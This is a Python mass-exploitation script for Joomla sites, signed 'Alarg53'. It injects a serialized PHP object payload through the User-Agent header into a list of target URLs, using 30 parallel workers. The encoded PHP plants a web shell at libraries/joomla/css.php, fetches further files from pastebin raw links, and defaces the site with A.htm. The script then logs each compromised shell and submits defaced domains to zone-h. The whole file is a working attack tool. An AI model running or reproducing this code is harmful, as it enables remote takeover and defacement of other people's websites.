#!/usr/bin/python 
# coding=utf-8

'''
      Alarg53
'''
   
import requests, re, sys
from multiprocessing import Pool
from time import time as timer
import codecs
#with codecs.open(sys.argv[1], mode='r', encoding='utf-8', errors='ignore') as

try:
    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
        ooo=f.read().splitlines()
except IOError :
    pass
#open(sys.argv[1], encoding = 'utf-8')
ooo = list( set( ooo ) )
   
def get_url(url):
    pl = generate_payload("base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvbGlicmFyaWVzL2pvb21sYS9jc3MucGhwIiA7DQokZnA9Zm9wZW4oIiRjaGVjayIsIncrIik7DQpmd3JpdGUoJGZwLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFOQ21aMWJtTjBhVzl1SUdoMGRIQmZaMlYwS0NSMWNtd3BldzBLQ1NScGJTQTlJR04xY214ZmFXNXBkQ2drZFhKc0tUc05DZ2xqZFhKc1gzTmxkRzl3ZENna2FXMHNJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc0lERXBPdzBLQ1dOMWNteGZjMlYwYjNCMEtDUnBiU3dnUTFWU1RFOVFWRjlEVDA1T1JVTlVWRWxOUlU5VlZDd2dNVEFwT3cwS0NXTjFjbXhmYzJWMGIzQjBLQ1JwYlN3Z1ExVlNURTlRVkY5R1QweE1UMWRNVDBOQlZFbFBUaXdnTVNrN0RRb0pZM1Z5YkY5elpYUnZjSFFvSkdsdExDQkRWVkpNVDFCVVgwaEZRVVJGVWl3Z01DazdEUW9KY21WMGRYSnVJR04xY214ZlpYaGxZeWdrYVcwcE93MEtDV04xY214ZlkyeHZjMlVvSkdsdEtUc05DbjBOQ2lSamFHVmpheUE5SUNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwyeHBZbkpoY21sbGN5OXFiMjl0YkdFdlkzTnpMbkJvY0NJZ093MEtKSFJsZUhRZ1BTQm9kSFJ3WDJkbGRDZ25hSFIwY0RvdkwzQmhjM1JsWW1sdUxtTnZiUzl5WVhjdlNsUlJXa3d6VVZVbktUc05DaVJ2Y0dWdUlEMGdabTl3Wlc0b0pHTm9aV05yTENBbmR5Y3BPdzBLWm5keWFYUmxLQ1J2Y0dWdUxDQWtkR1Y0ZENrN0RRcG1ZMnh2YzJVb0pHOXdaVzRwT3cwS2FXWW9abWxzWlY5bGVHbHpkSE1vSkdOb1pXTnJLU2w3RFFvZ0lDQWdaV05vYnlBa1kyaGxZMnN1SWp3dlluSStJanNOQ24xbGJITmxJQTBLSUNCbFkyaHZJQ0p1YjNRZ1pYaHBkSE1pT3cwS1pXTm9ieUFpWkc5dVpTQXVYRzRnSWlBN0RRb2tZMmhsWTJzelBTUmZVMFZTVmtWU1d5ZEVUME5WVFVWT1ZGOVNUMDlVSjEwZ0xpQWlMMEV1YUhSdElpQTdEUW9rZEdWNGRETWdQU0JvZEhSd1gyZGxkQ2duYUhSMGNEb3ZMM0JoYzNSbFltbHVMbU52YlM5eVlYY3ZRVWhaZUZOeWJsVW5LVHNOQ2lSdmNETTlabTl3Wlc0b0pHTm9aV05yTXl3Z0ozY25LVHNOQ21aM2NtbDBaU2drYjNBekxDUjBaWGgwTXlrN0RRcG1ZMnh2YzJVb0pHOXdNeWs3RFFvTkNpUmphR1ZqYXpROUpGOVRSVkpXUlZKYkowUlBRMVZOUlU1VVgxSlBUMVFuWFNBdUlDSXZiR2xpY21GeWFXVnpMMnB2YjIxc1lTOWphR1ZqYXk1d2FIQWlJRHNOQ2lSMFpYaDBOQ0E5SUdoMGRIQmZaMlYwS0Nkb2RIUndPaTh2Y0dGemRHVmlhVzR1WTI5dEwzSmhkeTlJVEhaQ1RWQk9RaWNwT3cwS0pHOXdORDFtYjNCbGJpZ2tZMmhsWTJzMExDQW5keWNwT3cwS1puZHlhWFJsS0NSdmNEUXNKSFJsZUhRMEtUc05DbVpqYkc5elpTZ2tiM0EwS1RzTkNnMEtKR05vWldOck5qMGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTlzYVdKeVlYSnBaWE12YW05dmJXeGhMM05sYzNOcGIyNHZjMlZ6YzJsdmJpNXdhSEFpSURzTkNpUjBaWGgwTmlBOUlHaDBkSEJmWjJWMEtDZG9kSFJ3T2k4dmNHRnpkR1ZpYVc0dVkyOXRMM0poZHk5SVRIWkNUVkJPUWljcE93MEtKRzl3TmoxbWIzQmxiaWdrWTJobFkyczJMQ0FuZHljcE93MEtabmR5YVhSbEtDUnZjRFlzSkhSbGVIUTJLVHNOQ21aamJHOXpaU2drYjNBMktUc05DZzBLUUhWdWJHbHVheWhmWDBaSlRFVmZYeWs3RFFvTkNqOCsnKSk7DQpmY2xvc2UoJGZwKTs=')")
    headers = {
    'User-Agent': pl
    }
    try:
        cookies = requests.get(url,headers=headers,timeout= 15).cookies
    except:
        pass
    try:
        rr = requests.get(url+'/', headers=headers,cookies=cookies,timeout= 15)
        if rr :
            print(url+" PayLoad Sent")
            get = requests.get(url+'/libraries/joomla/css.php',timeout= 15)
            scheck= requests.get(url+'/libraries/joomla/css.php',timeout= 15)
            if 'Alarg53' in scheck.text :
                print(url+" ===>Shell OK")
                shellz= url+'/libraries/joomla/css.php'
            codecs.open('j6shellz.txt', mode='a', encoding='ascii', errors='ignore').write(shellz+'\n')
            wcheck=requests.get(url+'/A.htm',timeout= 15)
            if 'Alarg53' in wcheck.text:
                print(url+" ===>Defaced OK")
                dom=url+'/A.htm'
                codecs.open('j6defaced.txt', mode='a', encoding='ascii', errors='ignore').write(dom+'\n')
                ccheck=requests.get(url+'/libraries/joomla/check.php',timeout= 15)
                if 'Alarg53' in ccheck.text:
                    print(url+" ===>Uname OK")
                    codecs.open('j6uname.txt', mode='a', encoding='ascii', errors='ignore').write(ccheck.text+'\n'+shellz+'\n')
                    zcheck=requests.post('http://zone-h.org/notify/single', data={
                        'defacer':'Alarg53','domain1':dom,'hackmode':'15','reason':'1','submit':'Send'
                        },timeout = 10,headers = headers)
                    if 'color="red">OK</font></li>' in zcheck.text:
                        print(url+" ===>Zone-H OK")
                        codecs.open('j6zoneh.txt', mode='a', encoding='ascii', errors='ignore').write(dom+'\n')
                    else:
                        print(url+" ===>Zone-H NONO")
            else:
                print(url+" ===>Not Defaced")
        else:
            print(url+" ===>SHell Not Found")

    except:
        pass
     
def php_str_noquotes(data):
    "Convert string to chr(xx).chr(xx) for use in php"
    encoded = ""
    for char in data:
        encoded += "chr({0}).".format(ord(char))
   
    return encoded[:-1]
   
   
def generate_payload(php_payload):
   
    php_payload = "eval({0})".format(php_payload)
   
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
   
    return exploit_template







def goo():
    try:
        start= timer()
        pp=Pool(30)
        pr=pp.map(get_url, ooo)
        print('Time: '+str(timer()-start)+' seconds')
    except:
        pass

'''for x in ooo:
    zzz=get_url(x, pl)
'''

if __name__=='__main__':
    goo()
 
#  fb/alarg53.man [2016-12-25]  #